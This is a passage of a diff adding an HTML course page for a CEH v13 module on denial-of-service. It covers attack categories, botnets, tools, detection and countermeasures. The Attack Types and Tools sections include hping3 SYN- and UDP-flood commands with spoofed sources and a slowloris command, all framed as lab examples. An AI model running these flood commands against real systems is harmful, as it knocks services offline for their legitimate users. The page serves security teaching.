+    --bg: #fff; --bg-elev: #fff; --surface: #fff; --surface-2: #fff;
+    --text: #000; --text-muted: #333; --text-faint: #555;
+    --border: #999; --accent: #000; --accent-dim: transparent;
+    --code-bg: #f2f2f2; --code-text: #000; --shadow: none; --shadow-lg: none;
+  }
+  .controlbar, .navigation, .progress-wrap, .matrix-bg, .course-nav,
+  .notes-fab, .notes-panel,
+  .notification, .demo-controls, .btn, .modal, .tooltip-bubble { display: none !important; }
+  .term { border-bottom: none; background: none; color: inherit; }
+  .module-section { display: block !important; page-break-after: always; }
+  .card, .feature-card, .tool-card { page-break-inside: avoid; box-shadow: none; }
+  a[href^="http"]::after { content: " (" attr(href) ")"; font-size: .8em; word-break: break-all; }
+  body { font-size: 11pt; }
+}
+
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to main content</a>
+<div class="matrix-bg" id="matrixBg" aria-hidden="true"></div>
+<p id="a11yStatus" class="visually-hidden" role="status" aria-live="polite"></p>
+
+<div class="controlbar">
+    <span class="controlbar__brand">CEH v13 · Module 10</span>
+
+    <div class="controlbar__group" role="group" aria-label="Text size">
+        <span class="controlbar__label" aria-hidden="true">Text</span>
+        <button class="ctl" id="fontDec" type="button" aria-label="Decrease text size">&minus;</button>
+        <span class="controlbar__label" id="fontSizeValue" aria-live="polite">100%</span>
+        <button class="ctl" id="fontInc" type="button" aria-label="Increase text size">+</button>
+    </div>
+
+    <button class="ctl" id="themeToggle" type="button" aria-pressed="true"
+            aria-label="Switch to light theme">
+        <span class="ctl__icon" aria-hidden="true">🌙</span><span class="ctl__text">Dark</span>
+    </button>
+
+    <button class="ctl" id="printBtn" type="button" aria-label="Print this module">
+        <span aria-hidden="true">🖨</span><span class="ctl__text">Print</span>
+    </button>
+
+    <button class="ctl" type="button" data-action="resetProgress"
+            aria-label="Reset progress for this module">Reset</button>
+</div>
+
+<div class="container">
+    <header class="header">
+        <h1>CEH v13 Module 10: Denial-of-Service</h1>
+        <div class="module-info">
+            <h3>Denial-of-Service and Distributed Denial-of-Service</h3>
+            <p>Volumetric, protocol, and application-layer attacks; botnet architecture; and the detection, rate-limiting, and scrubbing strategies used to absorb them.</p>
+            <div style="margin-top: 14px;">
+                    <span class="highlight">⏱️ 3+ hours</span>
+                    <span class="highlight">🧪 Hands-on labs</span>
+                    <span class="highlight">📝 Assessment</span>
+                    <span class="highlight">🔬 Interactive demos</span>
+            </div>
+        </div>
+    </header>
+
+    <nav class="navigation" role="tablist" aria-label="Module sections">
+        <button class="nav-btn" role="tab" id="tab-overview" data-target="overview" aria-controls="overview" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📋 Overview</button>
+        <button class="nav-btn" role="tab" id="tab-dos-concepts" data-target="dos-concepts" aria-controls="dos-concepts" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 💥 DoS Concepts</button>
+        <button class="nav-btn" role="tab" id="tab-attack-types" data-target="attack-types" aria-controls="attack-types" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> ⚔️ Attack Types</button>
+        <button class="nav-btn" role="tab" id="tab-botnets" data-target="botnets" aria-controls="botnets" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🤖 Botnets & DDoS</button>
+        <button class="nav-btn" role="tab" id="tab-tools" data-target="tools" aria-controls="tools" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🔧 Attack Tools</button>
+        <button class="nav-btn" role="tab" id="tab-detection" data-target="detection" aria-controls="detection" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🔍 Detection</button>
+        <button class="nav-btn" role="tab" id="tab-countermeasures" data-target="countermeasures" aria-controls="countermeasures" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 🛡️ Countermeasures</button>
+        <button class="nav-btn" role="tab" id="tab-case-studies" data-target="case-studies" aria-controls="case-studies" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📚 Case Studies</button>
+        <button class="nav-btn" role="tab" id="tab-quiz" data-target="quiz" aria-controls="quiz" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📝 Assessment</button>
+        <button class="nav-btn" role="tab" id="tab-resources" data-target="resources" aria-controls="resources" aria-selected="false" tabindex="-1"><span class="nav-btn__done" aria-hidden="true"></span> 📚 Resources</button>
+    </nav>
+
+    <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar" role="progressbar"
+             aria-label="Module progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <span class="progress-text" id="progressText">0 of 10 sections · 0%</span>
+    </div>
+
+    <main id="main">
+<!-- Overview Section -->
+            <section id="overview" class="module-section active" role="tabpanel" aria-labelledby="tab-overview" tabindex="0">
+            <h2 class="section-title">🎯 Module Overview</h2>
+
+            <div class="card">
+                <h3>What denial of service is — and why it's different</h3>
+                <p>Most attacks in this course aim at <em><span class="term" data-term="confidentiality">confidentiality</span></em> (stealing data) or <em><span class="term" data-term="integrity">integrity</span></em> (altering it). Denial-of-service attacks target the third pillar of security: <strong><span class="term" data-term="availability">availability</span></strong>. The goal is not to break in or steal anything, but to make a system, service, or network unusable for its legitimate users. A successful DoS attack does not compromise a single account or exfiltrate a single file — yet it can cost an organization millions in lost revenue, drive customers away, and, increasingly, serve as a smokescreen for a second attack happening in the noise.</p>
+                <p>The mechanism is conceptually simple: every system has finite resources — bandwidth, memory, CPU, connection slots, application worker threads — and a DoS attack consumes one of those resources faster than legitimate traffic can, until nothing is left for real users. The art of the attack is in finding the cheapest way to exhaust the most expensive resource; the art of the defense is in absorbing or filtering the malicious load before it reaches that limit.</p>
+            </div>
+
+            <div class="card">
+                <h3>DoS vs. DDoS: the force multiplier</h3>
+                <p>The distinction between the two acronyms is the single most important concept in this module. A <strong>DoS (Denial of Service)</strong> attack comes from a single source — one machine flooding a target. This is easy to defend against: the target simply blocks the offending IP address, and the attack stops. A <strong><span class="term" data-term="ddos">DDoS</span> (Distributed Denial of Service)</strong> attack comes from <em>thousands or millions</em> of sources simultaneously, coordinated by an attacker who controls them all. This distribution is what makes DDoS so formidable: there is no single IP to block, the aggregate traffic can dwarf any target's capacity, and the sources are often innocent, compromised third-party devices whose owners have no idea they are participating.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>DoS — one source</h4>
+                        <p>A single machine attacks the target. Blockable by dropping one IP. Limited by the attacker's own bandwidth. Largely a historical or niche threat today, useful mainly for understanding the underlying techniques.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>DDoS — many sources</h4>
+                        <p>A coordinated army of compromised machines (a <span class="term" data-term="botnet">botnet</span>) attacks at once. No single IP to block; aggregate bandwidth can reach tens of terabits per second. The dominant real-world form, and the reason cloud-scale mitigation exists.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>The scale problem in 2026</h3>
+                <p>To understand why DDoS defense has become a specialized, cloud-scale discipline, consider how the numbers have escalated. The <strong>Mirai</strong> botnet of 2016 — the first to weaponize insecure IoT devices at scale — took down major sites with attacks around 1 Tbps and shocked the industry. By late 2025, the record had climbed to <strong>31.4 Tbps</strong>, attributed to the Aisuru-Kimwolf botnet of an estimated one to four million compromised devices. Hyper-volumetric attacks exceeding 1 Tbps, once a once-a-year headline, are now measured in the dozens per day. Perhaps most significantly, chunks of these botnets are rented out as a service for a few hundred dollars, putting attack capacity that dwarfs most organizations' entire internet connection within reach of an unskilled attacker.</p>
+                <p>The lesson this module builds toward is that no single organization can absorb a modern hyper-volumetric attack on its own connection — the defense has moved into the cloud, to providers whose networks are large enough to soak up terabits of malicious traffic and scrub it before it ever reaches the target.</p>
+            </div>
+
+            <div class="warning-box">
+                <p><strong>Authorized testing only.</strong> Launching a denial-of-service attack against any system you do not own is a serious crime in virtually every jurisdiction, and the distributed, third-party nature of DDoS means you would also be misusing the compromised devices of innocent parties. Even stress-testing your own infrastructure can spill over onto shared hosting or upstream providers, so authorized DoS testing is done only in isolated lab environments or with explicit written permission from every affected party.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["dos-concepts"]'>Begin → DoS/DDoS Fundamentals</button>
+        </section>
+
+            <!-- DoS Concepts Section -->
+            <section id="dos-concepts" class="module-section" role="tabpanel" aria-labelledby="tab-dos-concepts" tabindex="0" hidden="">
+            <h2 class="section-title">💡 DoS/DDoS Fundamentals</h2>
+
+            <div class="card">
+                <h3>The three categories that organize everything</h3>
+                <p>Every DoS/DDoS attack, no matter how it is marketed or named, works by exhausting one of three kinds of resource. Learning these three categories is the key that unlocks the whole subject, because each category attacks a different layer, requires a different defense, and produces a different signature. The CEH exam and every serious mitigation product organize their thinking around exactly this taxonomy.</p>
+                <div class="grid-3">
+                    <div class="feature-card">
+                        <h4>1. Volumetric attacks</h4>
+                        <p>Exhaust <strong>bandwidth</strong> — the size of the pipe. The attacker sends more data than the target's internet connection can carry, so legitimate traffic cannot get through, like a highway jammed with cars. Measured in <strong>bits per second (bps)</strong>. This is the "brute force" category and the source of the terabit-scale headlines.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>2. Protocol attacks</h4>
+                        <p>Exhaust <strong>connection-state resources</strong> — the finite tables in servers, firewalls, and load balancers that track connections. The attacker abuses how a protocol works (classically TCP) to consume these slots. Measured in <strong>packets per second (pps)</strong>. Efficient: a small amount of traffic can exhaust a large amount of state.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>3. Application-layer attacks</h4>
+                        <p>Exhaust <strong>application resources</strong> — the CPU, memory, and worker threads a server spends processing each request. The attacker sends requests that look legitimate but are deliberately expensive to serve. Measured in <strong>requests per second (rps)</strong>. Low-bandwidth, hard to distinguish from real traffic, and increasingly the weapon of choice.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Why the measurement units matter</h3>
+                <p>The three different units — bps, pps, rps — are not trivia; they tell you what a given attack is actually stressing and therefore how to defend. A volumetric attack quoted at "7.3 Tbps" is about the sheer volume of bits saturating a link, defended by having a bigger pipe or scrubbing upstream. A protocol attack quoted in "packets per second" is about the <em>rate</em> of packets exhausting state tables, defended by devices that track and validate connection state. An application attack quoted in "requests per second" — like the 200-million-rps HTTP floods of late 2025 — is about the number of expensive operations demanded of the application, defended by rate limiting and behavioral analysis at Layer 7. When you read a threat report, the unit tells you which category you are looking at.</p>
+            </div>
+
+            <div class="card">
+                <h3>The anatomy of a DDoS: the attacker's hierarchy</h3>
+                <p>A distributed attack is not a mob of individuals; it is a command hierarchy. At the top is the <strong>attacker</strong> (sometimes called the botmaster), who never sends attack traffic directly. Below them are one or more <strong>command-and-control (<span class="term" data-term="c2">C2</span>) servers</strong>, which relay the attacker's instructions. At the bottom are the <strong>bots</strong> or <strong>zombies</strong> — the compromised devices that actually generate the flood, collectively a <strong>botnet</strong>. This structure serves two purposes: it multiplies the attacker's firepower to the combined bandwidth of the entire botnet, and it insulates the attacker, whose own machine never touches the victim, making attribution extremely difficult.</p>
+                <p>Understanding this hierarchy is also what reveals the defensive opportunities: disrupting the C2 servers can decapitate an entire botnet at once (as when Lumen's researchers disrupted 550+ Aisuru C2 nodes in October 2025), and securing the IoT devices that become bots shrinks the pool of available zombies. The botnet section explores this structure in depth.</p>
+            </div>
+
+            <div class="card">
+                <h3>Reflection and amplification: getting others to attack for you</h3>
+                <p>The most bandwidth-efficient volumetric attacks use a devastating trick called <strong>reflection with amplification</strong>. The attacker sends a small request to a third-party server (a DNS resolver, an NTP server, a Memcached server) but <em>spoofs the source address</em> so the reply is sent to the victim instead of back to the attacker. This is reflection — the third party unwittingly reflects traffic at the target. Amplification is what makes it dangerous: for certain protocols, the reply is far larger than the request. A small DNS query produces a much larger response; Memcached, the most extreme case, can amplify traffic by a factor of <strong>51,200×</strong>. The attacker spends a trickle of bandwidth and directs a torrent at the victim, from thousands of innocent reflectors whose addresses are what the victim sees.</p>
+                <div class="info-box">
+                    <p><strong>Why amplification exists:</strong> these are UDP-based protocols with no handshake, so a server cannot verify that the requester's address is genuine before replying. The defense is twofold — network operators implementing <strong>source-address validation (BCP 38)</strong> so spoofed packets can't leave their networks in the first place, and administrators securing or restricting the reflector services (open DNS resolvers, exposed Memcached) that make amplification possible.</p>
+                </div>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["attack-types"]'>Next → Attack Types</button>
+        </section>
+
+            <!-- Attack Types Section -->
+            <section id="attack-types" class="module-section" role="tabpanel" aria-labelledby="tab-attack-types" tabindex="0" hidden="">
+            <h2 class="section-title">🎯 Attack Types</h2>
+
+            <div class="card">
+                <h3>The classic attacks that define each category</h3>
+                <p>Each of the three categories from the Fundamentals section has canonical attacks that the exam expects you to know by name and mechanism. Understanding <em>how</em> each one exhausts its target resource — not just its name — is what lets you recognize a novel variant as a member of a familiar family.</p>
+            </div>
+
+            <div class="card">
+                <h3>Protocol attacks: the SYN flood</h3>
+                <p>The <strong>SYN flood</strong> is the textbook protocol attack, and it beautifully illustrates how a small amount of traffic can exhaust a large resource by abusing how a protocol is supposed to work. Recall the TCP three-way handshake: a client sends <code>SYN</code>, the server replies <code>SYN-ACK</code> and reserves resources for the pending connection, and the client completes it with <code>ACK</code>. The SYN flood exploits the gap: the attacker sends a torrent of <code>SYN</code> packets, usually with spoofed source addresses, but <em>never sends the final</em> <code>ACK</code>. The server dutifully allocates connection state for each one and waits — holding these <strong>half-open connections</strong> until they time out. With its connection table full of half-open entries, the server can accept no new legitimate connections. A trickle of SYN packets ties up a server's entire capacity to accept clients.</p>
+                <div class="code-block"># A SYN flood with hping3 (authorized lab use only)
+hping3 -S --flood -p 80 --rand-source 192.168.1.10
+#   -S           send SYN packets
+#   --flood      send as fast as possible
+#   --rand-source  spoof random source <span class="term" data-term="ips">IPs</span> (defeats simple IP blocking)</div>
+                <p><strong>The defense</strong> is <strong>SYN cookies</strong>, a clever technique where the server encodes the connection state into the sequence number of its <code>SYN-ACK</code> rather than storing it, so it allocates no memory until the handshake actually completes. A flood of SYNs that never complete therefore costs the server nothing.</p>
+            </div>
+
+            <div class="card">
+                <h3>Volumetric attacks: floods and amplification</h3>
+                <p>Volumetric attacks are conceptually the simplest — send more traffic than the pipe can hold — but their scale is what makes them fearsome. <strong>UDP floods</strong> blast the target with UDP packets to random ports; because UDP is connectionless, the target wastes resources checking for (nonexistent) listening applications and replying with "port unreachable" messages. <strong>ICMP floods</strong> (ping floods) do the same with ICMP echo requests. Neither is efficient on its own — the attacker must supply all the bandwidth — which is why serious volumetric attacks use the <strong>reflection and amplification</strong> technique from the Fundamentals section, borrowing the bandwidth of thousands of innocent DNS, NTP, or Memcached servers to multiply a small attack into a terabit-scale flood.</p>
+            </div>
+
+            <div class="card">
+                <h3>Application-layer attacks: cheap requests, expensive answers</h3>
+                <p>Application-layer (Layer 7) attacks are the most sophisticated and increasingly the most common, because they turn the server's own logic against it and are extremely hard to distinguish from legitimate users. Instead of brute-force volume, they send requests that are individually valid but deliberately expensive to serve.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>HTTP flood</h4>
+                        <p>A barrage of seemingly legitimate HTTP GET or POST requests, ideally aimed at the most expensive operations — a search query, a database-heavy report, a login. Each request looks like a real user, so simple filtering fails; the server drowns in genuine-looking work. Modern versions reach hundreds of millions of requests per second.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Slowloris (low-and-slow)</h4>
+                        <p>The opposite of a flood: it opens many connections and holds them open by sending partial HTTP requests very slowly, never quite finishing. It ties up the server's finite connection pool with almost no bandwidth — a single machine can take down a web server. Defeated by connection timeouts and reverse proxies that buffer complete requests.</p>
+                    </div>
+                </div>
+                <p>A modern and important example is <strong>HTTP/2 Rapid Reset</strong> (CVE-2023-44487), which exploited a feature of the HTTP/2 protocol allowing a client to cancel a request immediately after sending it. By automating this request-then-cancel pattern, attackers forced servers to do the setup work for millions of requests per second while the connections themselves were instantly reset — powering the record-breaking 398-million-rps attack Google disclosed in 2023. It is a perfect illustration of the application-layer principle: not volume, but abuse of protocol logic to make the server spend resources cheaply demanded.</p>
+            </div>
+
+            <div class="card">
+                <h3>The trade-off, summarized</h3>
+                <p>The three categories sit on a spectrum. Volumetric attacks are <strong>loud, powerful, and blockable</strong> — enormous but obvious, and stoppable by upstream scrubbing. Application-layer attacks are <strong>quiet, efficient, and evasive</strong> — small enough to slip past volume-based defenses and hard to separate from real users, requiring behavioral analysis to catch. Protocol attacks sit in between. This is why no single defense suffices, and why the countermeasures section describes a layered stack rather than one silver bullet.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["botnets"]'>Next → Botnets</button>
+        </section>
+
+            <!-- Botnets Section -->
+            <section id="botnets" class="module-section" role="tabpanel" aria-labelledby="tab-botnets" tabindex="0" hidden="">
+            <h2 class="section-title">🤖 Botnets</h2>
+
+            <div class="card">
+                <h3>The engine behind every large DDoS</h3>
+                <p>A botnet is a network of compromised, remotely-controlled devices — the army that makes distributed attacks possible. Each device, called a <strong>bot</strong> or <strong>zombie</strong>, runs hidden <span class="term" data-term="malware">malware</span> that awaits commands from the attacker's command-and-control infrastructure. The owners of these devices are almost always unaware: their home router, security camera, or smart TV is quietly participating in attacks while functioning normally for them. Botnets are the reason a single attacker can command tens of terabits of bandwidth, and understanding their lifecycle reveals where they can be disrupted.</p>
+            </div>
+
+            <div class="card">
+                <h3>How a botnet is built and controlled</h3>
+                <p>A botnet's life follows a predictable cycle. First comes <strong>infection</strong>: the malware spreads by scanning the internet for vulnerable devices — most notoriously IoT devices with default or weak credentials — and installing itself. Next is <strong>rallying</strong>: each newly infected bot phones home to the command-and-control infrastructure to register itself and await orders. Then comes the <strong>attack</strong>: the botmaster issues a command through C2, and every bot simultaneously floods the designated target. Between attacks, the botnet <strong>maintains and grows</strong>, continuously scanning for new victims and updating its malware.</p>
+                <p>The command-and-control architecture is the botnet's nervous system and its <span class="term" data-term="vulnerability">vulnerability</span>. <strong>Centralized C2</strong> — where all bots connect to a small set of servers (often over IRC or HTTP) — is simple and responsive but creates a single point of failure: take down the C2 servers and the whole botnet goes dark. This is exactly what happened when researchers disrupted 550+ Aisuru command nodes in late 2025. To resist this, sophisticated botnets use <strong>peer-to-peer C2</strong>, where bots relay commands among themselves with no central server to seize, making the botnet far more resilient but harder for the attacker to control.</p>
+            </div>
+
+            <div class="card">
+                <h3>Mirai and its descendants: the IoT era</h3>
+                <p>No botnet is more important to understand than <strong>Mirai</strong>, because it defined the modern era and its code underpins most of what came after. In 2016, Mirai demonstrated that the explosion of insecure IoT devices — cameras, routers, DVRs shipped with default passwords and never patched — was a vast, untapped botnet reservoir. It spread by trying a short list of default credentials against internet-connected devices, assembled hundreds of thousands of them, and launched attacks around 1 Tbps that took down security journalist Brian Krebs' site, the hosting provider OVH, and the DNS provider Dyn — the last of which cascaded into outages at Netflix, Twitter, and PayPal. Crucially, Mirai's source code was published, and every major IoT botnet since is a descendant or imitator.</p>
+                <p>The current apex is <strong>Aisuru</strong> (also called Kimwolf), a Mirai-class botnet of an estimated one to four million devices — primarily Android TVs and unpatched residential routers — that built on Mirai's architecture with better evasion and higher packet throughput. Aisuru was responsible for the record 31.4 Tbps attack of November 2025 and over a thousand hyper-volumetric attacks in a single quarter. Its rise illustrates two trends the module keeps returning to: attacks keep getting larger, and botnet capacity is increasingly rented out as a commodity service.</p>
+            </div>
+
+            <div class="card">
+                <h3>DDoS-as-a-service: the commoditization of firepower</h3>
+                <p>Perhaps the most consequential development is that launching a devastating DDoS no longer requires building a botnet. <strong>"Booter" and "stresser" services</strong> — marketed with a thin veneer of legitimacy as network-testing tools — rent out botnet capacity for a few dollars to a few hundred dollars. Chunks of the Aisuru botnet have reportedly been offered this way, putting hyper-volumetric attack capability that exceeds most organizations' entire internet connection into the hands of anyone with a credit card and a grievance. This commoditization is why DDoS has shifted from a rare, sophisticated threat to a routine one, and why defense has had to industrialize in response.</p>
+            </div>
+
+            <div class="card">
+                <h3>Where botnets can be broken</h3>
+                <p>The botnet lifecycle exposes three points of defensive leverage, and a complete strategy touches all three. <strong>Shrink the pool</strong> by securing the devices that become bots — changing default IoT credentials, applying firmware updates, and segmenting IoT devices onto isolated networks. <strong>Decapitate the control</strong> by identifying and disrupting C2 infrastructure, a job usually done by security researchers, ISPs, and law enforcement working together. <strong>Absorb the output</strong> with the cloud-scale scrubbing described in Countermeasures, which handles the attack traffic even when the botnet itself cannot be dismantled. Because no one of these is sufficient alone — you cannot secure every IoT device, seize every C2, or out-scale every botnet — real defense combines all three.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["tools"]'>Next → Attack Tools</button>
+        </section>
+
+            <!-- Tools Section -->
+            <section id="tools" class="module-section" role="tabpanel" aria-labelledby="tab-tools" tabindex="0" hidden="">
+            <h2 class="section-title">🛠️ Attack Tools</h2>
+
+            <div class="card">
+                <h3>Understanding the tools reveals the attacks</h3>
+                <p>The tools used to generate DoS traffic are worth studying not to wield them, but because each one embodies a technique from the previous sections, and recognizing a tool's signature is part of detection. They range from crude flooding utilities that anyone can point and click, to precise packet crafters used by professionals for authorized testing. A defender who knows what these tools produce knows what to watch for in their traffic.</p>
+            </div>
+
+            <div class="card">
+                <h3>Volumetric flooding tools</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>LOIC (Low Orbit Ion Cannon)</h4>
+                        <p>A simple, open-source flooding tool that gained infamy in hacktivist campaigns because it let non-technical volunteers point their machines at a target with a single click, coordinating a crude voluntary botnet. It offers no anonymity — participants' real IP addresses are exposed in the flood — which is how many early users were identified and prosecuted. Its significance is historical and social more than technical.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>HOIC (High Orbit Ion Cannon)</h4>
+                        <p>LOIC's successor, focused on HTTP flooding with "booster" scripts that randomized requests to evade simple filtering and could target multiple sites at once. It represented the shift from crude packet floods toward application-layer attacks that are harder to distinguish from real traffic.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Low-and-slow tools</h3>
+                <p><strong>Slowloris</strong> is the canonical low-and-slow tool, and it upends the intuition that DoS requires massive bandwidth. It opens many connections to a web server and keeps each alive by trickling out partial HTTP headers, never completing a request. The server holds every connection open waiting for the rest, and its finite connection pool fills with these deliberate stragglers — all from a single machine using almost no bandwidth. <strong>RUDY (R-U-Dead-Yet)</strong> applies the same philosophy to HTTP POST bodies, submitting form data one byte at a time. These tools are a favorite teaching example because they prove that DoS is about exhausting <em>a</em> resource — here, connection slots — not about raw volume.</p>
+                <div class="code-block"># Slowloris ties up a server's connection pool with partial requests
+slowloris 192.168.1.10 -p 80 -s 500
+#   -s 500   open 500 slow connections
+# Defense: connection timeouts + a reverse proxy that buffers full requests</div>
+            </div>
+
+            <div class="card">
+                <h3>Packet crafting: hping3 and its uses</h3>
+                <p><strong>hping3</strong> is not a DoS tool per se but a general-purpose packet crafter, which is precisely why it is valuable for authorized testing: it can construct almost any packet by hand, letting a tester reproduce a SYN flood, a UDP flood, or a custom protocol attack with exact control over every field. Its <code>--rand-source</code> option spoofs source addresses to simulate a distributed attack from a single machine. Because it operates at the packet level, hping3 is the tool of choice for validating that a defense actually works — a defender can generate a controlled SYN flood in the lab and confirm that SYN cookies hold.</p>
+                <div class="code-block"># Controlled SYN flood for authorized defense testing
+hping3 -S --flood -p 80 --rand-source target.lab
+
+# UDP flood variant
+hping3 --udp --flood -p 53 target.lab</div>
+            </div>
+
+            <div class="card">
+                <h3>From tools to services</h3>
+                <p>The trajectory of these tools tells the story of the whole field. Early tools like LOIC required each participant to run software and expose themselves. Botnet malware removed the need for volunteers by conscripting unwitting devices. And <strong>DDoS-as-a-service</strong> removed the need for the attacker to build anything at all — the booter services described in the Botnets section package this entire capability behind a web form. The defensive implication is sobering: the skill required to launch a serious attack has collapsed to nearly zero, which is why detection and cloud-scale mitigation, not deterrence, carry the defensive burden.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["detection"]'>Next → Detection Techniques</button>
+        </section>
+
+            <!-- Detection Section -->
+            <section id="detection" class="module-section" role="tabpanel" aria-labelledby="tab-detection" tabindex="0" hidden="">
+            <h2 class="section-title">🔍 Detection Techniques</h2>
+
+            <div class="card">
+                <h3>The core challenge: attack traffic that looks legitimate</h3>
+                <p>Detecting a DDoS attack sounds trivial — surely a flood is obvious? — but the real difficulty is the same one that runs through this entire module: the best attacks are engineered to resemble legitimate traffic. A volumetric flood is easy to spot but hard to stop; an application-layer attack of genuine-looking HTTP requests is hard even to <em>identify</em>, because each request is individually valid. Detection is therefore about distinguishing malicious patterns from legitimate ones fast enough to react, and doing it without blocking real users. The faster and more accurately you detect, the smaller the window of disruption.</p>
+            </div>
+
+            <div class="card">
+                <h3>The two detection philosophies</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>Signature-based detection</h4>
+                        <p>Matches traffic against known attack patterns — the specific packet structures of a SYN flood, the fingerprint of a particular tool, the request signature of HTTP/2 Rapid Reset. Fast and accurate for <em>known</em> attacks, and produces few false positives. Its weakness is that it cannot catch a novel attack it has no signature for, so it must be constantly updated.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Anomaly-based detection</h4>
+                        <p>Learns what <em>normal</em> traffic looks like — typical volume, packet rates, request distributions, geographic sources — and flags significant deviations. This can catch never-before-seen attacks, which is its great strength. Its weakness is false positives: a legitimate traffic spike (a product launch, a viral moment) can look like an attack, so it requires careful tuning and a well-established baseline.</p>
+                    </div>
+                </div>
+                <p>Mature defenses use both: signatures for the fast, confident blocking of known attacks, and anomaly detection as the safety net for the unknown. Increasingly, the anomaly side is powered by machine learning that models normal behavior in far more dimensions than a human could tune by hand — essential against AI-enhanced Layer 7 attacks that deliberately mimic human users.</p>
+            </div>
+
+            <div class="card">
+                <h3>What to watch: the indicators</h3>
+                <p>Regardless of philosophy, certain signals reliably indicate a possible DoS attack, and knowing them is practical detection knowledge:</p>
+                <ul>
+                    <li><strong>A sudden, sustained traffic spike</strong> far above baseline — the clearest volumetric indicator, though it must be distinguished from legitimate surges.</li>
+                    <li><strong>A flood of traffic from a single source or a narrow range</strong> — points to a simple DoS rather than a distributed one, and is easily blocked.</li>
+                    <li><strong>An abnormal protocol or packet-size distribution</strong> — a spike in SYN packets without corresponding ACKs signals a SYN flood; a flood of identically-sized UDP packets suggests a reflection attack.</li>
+                    <li><strong>Requests concentrated on one expensive endpoint</strong> — many requests hammering a search or login URL, the signature of an application-layer flood.</li>
+                    <li><strong>Many slow, incomplete connections</strong> — the fingerprint of a Slowloris-style low-and-slow attack.</li>
+                    <li><strong>Geographic or behavioral anomalies</strong> — traffic suddenly arriving from regions or at times that do not match your normal user base.</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Where detection happens</h3>
+                <p>Detection is deployed at several vantage points, each seeing a different slice of the problem. <strong>Network flow analysis</strong> (using NetFlow/sFlow data from routers) gives a broad, real-time view of traffic volumes and sources across the whole network — ideal for spotting volumetric attacks early. <strong>Intrusion detection systems (<span class="term" data-term="ids">IDS</span>)</strong> inspect packets for attack signatures. <strong>Application and server monitoring</strong> watches resource exhaustion — CPU, memory, connection counts, response times — which often reveals an application-layer attack that never showed up as unusual <em>volume</em>. And <strong>upstream provider monitoring</strong>, at the ISP or cloud-mitigation level, sees attacks building before they even reach the target. The most robust posture correlates signals from all of these, because a sophisticated attack may only be visible when the broad network view and the application-resource view are considered together.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["countermeasures"]'>Next → Countermeasures</button>
+        </section>
+
+            <!-- Countermeasures Section -->
+            <section id="countermeasures" class="module-section" role="tabpanel" aria-labelledby="tab-countermeasures" tabindex="0" hidden="">
+            <h2 class="section-title">🛡️ Countermeasures</h2>
+
+            <div class="card">
+                <h3>Why you can't defend a modern DDoS alone</h3>
+                <p>The single most important lesson of this module's defensive half is that <strong>no organization can absorb a hyper-volumetric attack on its own infrastructure</strong>. If an attacker can direct 31 terabits per second at you and your internet connection is measured in gigabits, no firewall, no server tuning, and no amount of on-premises hardware can help — the traffic saturates your link before it ever reaches your equipment. This physical reality has reshaped DDoS defense from an on-premises problem into a cloud-scale one, and it explains why the countermeasures below build from local hardening up to distributed, cloud-based absorption.</p>
+            </div>
+
+            <div class="card">
+                <h3>The layered defense stack</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>1. Local hardening (necessary, not sufficient)</h4>
+                        <p>Configuration that raises your own resilience: <strong>SYN cookies</strong> to defeat SYN floods without allocating memory, <strong>rate limiting</strong> to cap requests per source, connection timeouts to defeat low-and-slow attacks, and tuned firewall rules. This handles small attacks and buys time, but a large volumetric attack overwhelms it — it is the floor, not the ceiling, of defense.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>2. Overprovisioning and load balancing</h4>
+                        <p>Having more capacity than you normally need, and spreading load across many servers, so the target is harder to exhaust. Useful headroom against modest attacks, but economically impossible to scale to terabit attacks — you cannot buy 31 Tbps of standing capacity for a normal service.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>3. Cloud scrubbing services</h4>
+                        <p>The essential layer for serious protection. Providers like Cloudflare, Akamai, and AWS Shield route your traffic through their globally-distributed networks, which are large enough to absorb terabits of attack traffic, <strong>scrub</strong> out the malicious portion, and forward only clean traffic to you. Their scale is the only thing that matches the attackers' scale.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>4. Web application firewall (WAF)</h4>
